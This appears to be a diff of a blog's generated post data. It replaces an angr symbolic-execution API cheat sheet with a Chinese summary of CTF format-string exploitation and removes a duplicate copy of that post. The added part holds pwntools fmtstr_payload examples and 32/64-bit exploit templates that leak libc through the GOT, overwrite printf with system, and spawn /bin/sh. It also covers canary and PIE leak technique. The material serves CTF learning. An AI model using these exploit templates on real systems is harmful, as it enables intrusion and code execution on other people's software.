dumps(std)</span><br><span class="line">	 | - solver</span><br><span class="line">		   | - eval(claripy.BVS pass,cast_to)</span><br></pre></td></tr></table></figure>
-<h1 id="x02-api手册">0x02 API手册</h1>
-<ul>
-<li><strong>Project类(参数、功能、重载、返回值)</strong>
+<h1 id="原理-工具">原理 &amp; 工具</h1>
+<h2 id="原理">原理</h2>
+<blockquote>
+<p>本质是利用 printf(string) 任意地址读写</p>
+</blockquote>
+<blockquote>
+<p>记录一下常用的格式</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt    :        标准作用       ||           常用方式</span><br><span class="line">——————————————————————————————————————————————————————————————</span><br><span class="line">%p     :     输出栈上的内容     |  (读) 找偏移\pie_base\canary</span><br><span class="line">%s     :   输出地址指向的内容   ||     (读) 泄露libc_base</span><br><span class="line">%hhn   :   修改地址指向的byte   |        (写) 任意地址写</span><br><span class="line">%hn/%n : 修改地址指向的2/4bytes |        (写) 任意地址写</span><br></pre></td></tr></table></figure>
+<h2 id="工具-pwntools---fmtstr_payload">工具: Pwntools -
+fmtstr_payload</h2>
+<p><a href="https://docs.pwntools.com/en/stable/fmtstr.html">Pwntools -
+class fmtstr</a></p>
+<blockquote>
+<p>源码见上述链接或文章末尾的 Appendix</p>
+</blockquote>
+<p>fmtstr是一个类，我们只需要用其中的 fmtstr_payload 来构造我们的
+payload 即可。现在版本的 pwntools 已经支持 64 位的 格式化字符串 payload
+生成了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Default: numbwritten=0 , write_size=&#x27;byte&#x27;</span><br><span class="line">payload = fmtstr_payload(offset, writes, numbwritten=, write_size=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># Example:</span><br><span class="line">context.clear(arch = &#x27;amd64&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">context.clear(arch = &#x27;i386&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%5$na\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x00000001&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;c%3$naaa\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: b&quot;\xff\xff\x04\x11\x00\x00\x00\x00&quot;&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(10, &#123;0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%125c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc&gt;@@\x00cccc=@@\x00cccc?@@\x00cccc&lt;@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x404048 : 0xbadbad00&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%229c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x4040 : 0xbadbad00, 0x4060: 0xbadbad02&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%212c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
+<h1 id="ctf-中的题型">CTF 中的题型</h1>
+<h2 id="栈上">栈上</h2>
+<h3 id="位">32位</h3>
+<blockquote>
+<p>最基础的题目，fmtstr_payload一把梭，模板如下</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 确认偏移量</span><br><span class="line">payload = &#x27;%p-&#x27;*10</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 假设 offset=6，泄露libc基址</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">payload    = p32(printf_got) + b&#x27;%6$s&#x27;</span><br><span class="line"># payload  = b&#x27;%7$s&#x27; + p32(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 确认libc</span><br><span class="line">printf_addr = u32(io.recvuntil(&#x27;\x7f&#x27;)[-3:])</span><br><span class="line">libc        = LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(&#x27;printf&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line"># 接收程序信息，向程序发送payload</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_addr&#125;,numbwritten=0,write_size=&#x27;short&#x27;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 提权</span><br><span class="line">io.sendline(&#x27;;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>
+<h3 id="位-1">64位</h3>
+<blockquote>
+<p>由于许多地址只有六字节，所以为了对齐八字节，我们需要用''来填充，但''会截断
+printf 的输出，所以我们需要让 printf 先输出格式化字符.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># 确认偏移量</span><br><span class="line">payload = &#x27;%p-&#x27;*10</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 假设 offset=6，泄露libc基址</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">payload  = b&#x27;%7$sAAAA&#x27; + p64(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 确认libc</span><br><span class="line">printf_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">libc        = LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(&#x27;printf&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line"># 接收程序信息，向程序发送payload</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_addr&#125;,numbwritten=0,write_size=&#x27;short&#x27;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 提权</span><br><span class="line">io.sendline(&#x27;;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>
+<h2 id="非栈上bss段">非栈上(BSS段)</h2>
+<p>2023moeCTF的第三道fmt就是这种题目，exp在本地，后续有时间更新</p>
+<h2 id="特殊情况">特殊情况</h2>
+<h3 id="一次printf就返回">一次printf就返回</h3>
+<blockquote>
+<p>printf 的要求十分严格，通常有两种做法</p>
+</blockquote>
 <ol type="1">
-<li>构造函数参数：“命令行中运行程序的指令”(eg: "./00_angr_find")</li>
-<li>功能：“构建一个符号执行项目”</li>
-<li>附属成员
-<ul>
-<li><strong>factory</strong>
+<li>要求：栈上有一串具有三个函数的rbp的链，NO PIE，libc已知
 <ol type="1">
-<li>附属成员
-<ul>
-<li><strong>state</strong>
-<ol type="1">
-<li>重载函数
-<ul>
-<li><strong>entry_state()</strong>
-<ol type="1">
-<li>返回值：程序入口点</li>
+<li>做法：在栈上布满one_gadget，然后找到一条带有3个rbp的链，修改中间一个
+node 的低字节，让其指向的rbp变低，进而在返回时可以直接返回og</li>
 </ol></li>
-<li><strong>blank_state(addr)</strong>
-<ol type="1">
-<li>参数：模拟执行开始的地址</li>
-</ol></li>
-</ul></li>
-<li>附属成员
-<ul>
-<li><strong>regs</strong>
-<ol type="1">
-<li>附属成员: 各种寄存器</li>
-</ol></li>
-<li><strong>fs</strong>
-<ol type="1">
-<li>全称: filesystem</li>
-<li>附属成员：
-<ul>
-<li><strong>insert(string filename,angr.storage.simFile)</strong>
-<ol type="1">
-<li>参数1：文件名称</li>
-<li>参数2：创建过的符号化文件对象</li>
-</ol></li>
-</ul></li>
-</ol></li>
-</ul></li>
-</ol></li>
-<li><strong>simulation_manager类</strong>
-<ol type="1">
-<li>构造函数参数：起始状态</li>
-<li>功能：设置模拟执行的起始地址，并返回实例化对象</li>
-<li>附属成员
-<ul>
-<li><strong>explore(find, avoid)</strong>
-<ol type="1">
-<li>参数find：希望程序抵达的地址</li>
-<li>参数avoid：希望程序不抵达的地址</li>
-<li>功能：用符号探索到find指向的地址，并避免avoid指向的地址</li>
-<li>重载：explore(find=func1,avoid=func2) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func1(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line">def func2(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br></pre></td></tr></table></figure>
-<ol type="1">
-<li>功能：探索具有func1特征的的函数分支，回避具有func2特征的函数分支</li>
-</ol></li>
-</ol></li>
-<li><strong>found数组</strong>
-<ol type="1">
-<li>found_state的实例化数组</li>
-</ol></li>
-</ul></li>
-</ol></li>
-</ul></li>
-</ol></li>
-</ul></li>
-</ol></li>
-<li><strong>found_state类</strong>
-<ul>
-<li><strong>posix</strong>
-<ul>
-<li><strong>dumps(int std)</strong>
-<ol type="1">
-<li>参数std: stdin(0)/stdout(1)/stderr(2)</li>
-<li>功能: 将std指向的内容打印出来</li>
-</ol></li>
-</ul></li>
-<li>solver
-<ul>
-<li>eval(claripy.BVS arg1)
-<ol type="1">
-<li>参数：要求解的约束公式</li>
-<li>功能：求解arg1并返回结果</li>
-</ol></li>
-</ul></li>
-</ul></li>
-<li><strong>claripy类</strong>
-<ul>
-<li><strong>BVS类</strong>
-<ol type="1">
-<li>构造函数参数：arg1: 别名 | arg2: 符号向量占多少位</li>
-<li>功能：构建一个空的约束公示</li>
-</ol></li>
-</ul></li>
-<li><strong>storage类</strong>
-<ul>
-<li>SimFile(filename,content,size)
-<ol type="1">
-<li>参数filename：要引入的filename</li>
-<li>参数content：符号化向量</li>
-<li>参数size：要从文件中读取的字节数*8（单位：bits）</li>
-<li>功能：创建一个符号化的文件对象</li>
-</ol></li>
-</ul></li>
-<li><strong>sim_options类</strong>
-<ul>
-<li>SYMBOL_FILL_UNCONSTRAINED_MEMORY
-<ul>
-<li>功能：自动用符号填充未约束的内存（模拟过程中没有明确值的内存位置）</li>
-</ul></li>
-<li>SYMBOL_FILL_UNCONSTRAINED_REGISTERS
-<ul>
-<li>功能：自动用符号填充未约束的寄存器</li>
-</ul></li>
-</ul></li>
-</ul>
-<h1 id="x01-angr语法">0x01 Angr语法</h1>
-<h3 id="准备阶段">1. 准备阶段</h3>
-<ul>
-<li><p><strong>引入与初始化</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(exec_path)</span><br><span class="line"></span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"># init_state = p.factory.blank_state(addr) # addr = 0xbeef</span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br></pre></td></tr></table></figure></p></li>
-<li><p><strong>命令行引入参数</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def main(argv):</span><br><span class="line">	arg1 = argv[1]</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	main(sys.argv)</span><br></pre></td></tr></table></figure></p></li>
-<li><p><strong>符号向量</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">pass1 = claripy.BVS(&#x27;pass1&#x27;, 32)</span><br></pre></td></tr></table></figure></p></li>
-<li><p><strong>符号化寄存器</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init_state.regs.eax = pass1</span><br></pre></td></tr></table></figure></p></li>
-<li><p><strong>符号化文件</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename = &quot;&quot;</span><br><span class="line">filesize = </span><br><span class="line"></span><br><span class="line">password = init_state.solver.BVS(&#x27;password&#x27;,filesize*8)</span><br><span class="line">sim_file = angr.storage.SimFile(filename,content=password,size=filesize)</span><br><span class="line"></span><br><span class="line">init_state.fs.insert(sim_file)</span><br></pre></td></tr></table></figure></p></li>
-</ul>
-<h3 id="探索阶段">2. 探索阶段</h3>
-<ul>
-<li><p><strong>探索指定地址并查看标准流</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sm.explore(find = addr_to_find)</span><br></pre></td></tr></table></figure></p></li>
-<li><p><strong>利用函数explore分支</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def is_good(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">def is_bad(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"># sm.explore(find=addr_find, avoid=addr_avoid)</span><br></pre></td></tr></table></figure></p></li>
-</ul>
-<h3 id="输出阶段">3. 输出阶段</h3>
-<ul>
-<li><p><strong>查看结果</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if sm.found:</span><br><span class="line">	found_state = sm.found[0]</span><br><span class="line">	</span><br><span class="line">	print(&#x27;[x] Solution: &#123;&#125;&#x27;.format(found_state.posix.dumps(0)))</span><br></pre></td></tr></table></figure></p></li>
-<li><p><strong>求解寄存器的符号向量</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = init_state.solver.eval(BVS)</span><br></pre></td></tr></table></figure></p></li>
-</ul>
+<li><a
+href="https://www.freebuf.com/articles/system/385029.html">打fini_array（未学习）</a></li>
+</ol>
+<h3 id="full-relro">FULL RELRO</h3>
+<blockquote>
+<p>FULL RELRO 意味着我们不能修改 got 表，所以我们需要修改返回地址</p>
+</blockquote>
+<p>要求：可以 printf
+的次数较多(至少多于四次)，可以让我们将返回地址修改为 one_gadget</p>
+<h3 id="piecanary-bypass">PIE/Canary bypass</h3>
+<blockquote>
+<p>假设调用链为 main-&gt;func-&gt;printf，而在 func 中存放着 fmt，则栈中
+fmt
+上方不远处一定有调用printf语句的下一句(PC+4)，即返回地址，和canary</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设偏移量为6，栈构造如下</span><br><span class="line">---printf栈帧---</span><br><span class="line">................</span><br><span class="line"> printf_canary    &lt;- offset = 3</span><br><span class="line">   printf_rbp     &lt;- offset = 4</span><br><span class="line">printf_ret_addr   &lt;- offset = 5</span><br><span class="line">---printf栈帧---</span><br><span class="line"></span><br><span class="line">----func栈帧----</span><br><span class="line">      fmt         &lt;- offset = 6</span><br><span class="line">----func栈帧----</span><br><span class="line"></span><br><span class="line">----main栈帧----</span><br><span class="line">...............</span><br><span class="line">----main栈帧----</span><br><span class="line"></span><br><span class="line"># 泄露 pie_base &amp; canary</span><br><span class="line">payload = &#x27;%3$p-%5$p-END&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">func_addr,canary = [int(x,16) for x in io.recvuntil(&#x27;END&#x27;)[-35:-4].split(b&#x27;-&#x27;)]</span><br><span class="line">ret_offset = </span><br><span class="line">pie_base   = func_addr - ret_offset</span><br></pre></td></tr></table></figure>
+<h1 id="appendix">Appendix</h1>
+<h2
+id="pwnlib.fmtstr.fmtstr_payload源码">pwnlib.fmtstr.fmtstr_payload源码</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def fmtstr_payload (</span><br><span class="line">        offset,              # 字符串在栈上的偏移量</span><br><span class="line">        writes,              # &#123;target_addr:int_to_write&#125; 要写入的数字</span><br><span class="line">        numbwritten=0,       # printf 已经打印的字符数量</span><br><span class="line">        write_size=&#x27;byte&#x27;,   # 写入字节的大小</span><br><span class="line">        write_size_max=&#x27;long&#x27;, # </span><br><span class="line">        overflows=16,        # </span><br><span class="line">        strategy=&quot;small&quot;,    # 默认small，如果追求速度可以用fast模式</span><br><span class="line">        badbytes=frozenset(),  # </span><br><span class="line">        offset_bytes=0,      # </span><br><span class="line">        no_dollars=False     # 是否有 $ 符号,比如不用 &#x27;%996$n&#x27;</span><br><span class="line">    ):</span><br><span class="line"></span><br><span class="line">    sz = WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line"></span><br><span class="line">    fmt = b&quot;&quot;</span><br><span class="line">    for _ in range(1000000):</span><br><span class="line">        data_offset = (offset_bytes + len(fmt)) // context.bytes</span><br><span class="line">        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)</span><br><span class="line">        fmt = fmt + cyclic((-len(fmt)-offset_bytes) % context.bytes)</span><br><span class="line"></span><br><span class="line">        if len(fmt) + offset_bytes == data_offset * context.bytes:</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        raise RuntimeError(&quot;this is a bug ... format string building did not converge&quot;)</span><br><span class="line"></span><br><span class="line">    return fmt + data</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>Pwn</category>
       </categories>
       <tags>
-        <tag>SymbolicExecution</tag>
+        <tag>Pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -783,87 +864,6 @@ tmux 四个窗口梭哈遍历 D！</p>
       </tags>
   </entry>
   <entry>
-    <title>Pwn-格式化字符串汇总</title>
-    <url>/2024/01/21/blog19/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-总结一下格式化字符串漏洞，便于后续使用
-</blockquote>
-<span id="more"></span>
-<h1 id="原理-工具">原理 &amp; 工具</h1>
-<h2 id="原理">原理</h2>
-<blockquote>
-<p>本质是利用 printf(string) 任意地址读写</p>
-</blockquote>
-<blockquote>
-<p>记录一下常用的格式</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt    :        标准作用       ||           常用方式</span><br><span class="line">——————————————————————————————————————————————————————————————</span><br><span class="line">%p     :     输出栈上的内容     |  (读) 找偏移\pie_base\canary</span><br><span class="line">%s     :   输出地址指向的内容   ||     (读) 泄露libc_base</span><br><span class="line">%hhn   :   修改地址指向的byte   |        (写) 任意地址写</span><br><span class="line">%hn/%n : 修改地址指向的2/4bytes |        (写) 任意地址写</span><br></pre></td></tr></table></figure>
-<h2 id="工具-pwntools---fmtstr_payload">工具: Pwntools -
-fmtstr_payload</h2>
-<p><a href="https://docs.pwntools.com/en/stable/fmtstr.html">Pwntools -
-class fmtstr</a></p>
-<blockquote>
-<p>源码见上述链接或文章末尾的 Appendix</p>
-</blockquote>
-<p>fmtstr是一个类，我们只需要用其中的 fmtstr_payload 来构造我们的
-payload 即可。现在版本的 pwntools 已经支持 64 位的 格式化字符串 payload
-生成了。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Default: numbwritten=0 , write_size=&#x27;byte&#x27;</span><br><span class="line">payload = fmtstr_payload(offset, writes, numbwritten=, write_size=&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># Example:</span><br><span class="line">context.clear(arch = &#x27;amd64&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">context.clear(arch = &#x27;i386&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%5$na\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x00000001&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;c%3$naaa\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: b&quot;\xff\xff\x04\x11\x00\x00\x00\x00&quot;&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(10, &#123;0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%125c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc&gt;@@\x00cccc=@@\x00cccc?@@\x00cccc&lt;@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x404048 : 0xbadbad00&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%229c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x4040 : 0xbadbad00, 0x4060: 0xbadbad02&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%212c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
-<h1 id="ctf-中的题型">CTF 中的题型</h1>
-<h2 id="栈上">栈上</h2>
-<h3 id="位">32位</h3>
-<blockquote>
-<p>最基础的题目，fmtstr_payload一把梭，模板如下</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 确认偏移量</span><br><span class="line">payload = &#x27;%p-&#x27;*10</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 假设 offset=6，泄露libc基址</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">payload    = p32(printf_got) + b&#x27;%6$s&#x27;</span><br><span class="line"># payload  = b&#x27;%7$s&#x27; + p32(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 确认libc</span><br><span class="line">printf_addr = u32(io.recvuntil(&#x27;\x7f&#x27;)[-3:])</span><br><span class="line">libc        = LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(&#x27;printf&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line"># 接收程序信息，向程序发送payload</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_addr&#125;,numbwritten=0,write_size=&#x27;short&#x27;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 提权</span><br><span class="line">io.sendline(&#x27;;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>
-<h3 id="位-1">64位</h3>
-<blockquote>
-<p>由于许多地址只有六字节，所以为了对齐八字节，我们需要用''来填充，但''会截断
-printf 的输出，所以我们需要让 printf 先输出格式化字符.</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># 确认偏移量</span><br><span class="line">payload = &#x27;%p-&#x27;*10</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 假设 offset=6，泄露libc基址</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">payload  = b&#x27;%7$sAAAA&#x27; + p64(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 确认libc</span><br><span class="line">printf_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">libc        = LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(&#x27;printf&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line"># 接收程序信息，向程序发送payload</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_addr&#125;,numbwritten=0,write_size=&#x27;short&#x27;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"># 提权</span><br><span class="line">io.sendline(&#x27;;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>
-<h2 id="非栈上bss段">非栈上(BSS段)</h2>
-<p>2023moeCTF的第三道fmt就是这种题目，exp在本地，后续有时间更新</p>
-<h2 id="特殊情况">特殊情况</h2>
-<h3 id="一次printf就返回">一次printf就返回</h3>
-<blockquote>
-<p>printf 的要求十分严格，通常有两种做法</p>
-</blockquote>
-<ol type="1">
-<li>要求：栈上有一串具有三个函数的rbp的链，NO PIE，libc已知
-<ol type="1">
-<li>做法：在栈上布满one_gadget，然后找到一条带有3个rbp的链，修改中间一个
-node 的低字节，让其指向的rbp变低，进而在返回时可以直接返回og</li>
-</ol></li>
-<li><a
-href="https://www.freebuf.com/articles/system/385029.html">打fini_array（未学习）</a></li>
-</ol>
-<h3 id="full-relro">FULL RELRO</h3>
-<blockquote>
-<p>FULL RELRO 意味着我们不能修改 got 表，所以我们需要修改返回地址</p>
-</blockquote>
-<p>要求：可以 printf
-的次数较多(至少多于四次)，可以让我们将返回地址修改为 one_gadget</p>
-<h3 id="piecanary-bypass">PIE/Canary bypass</h3>
-<blockquote>
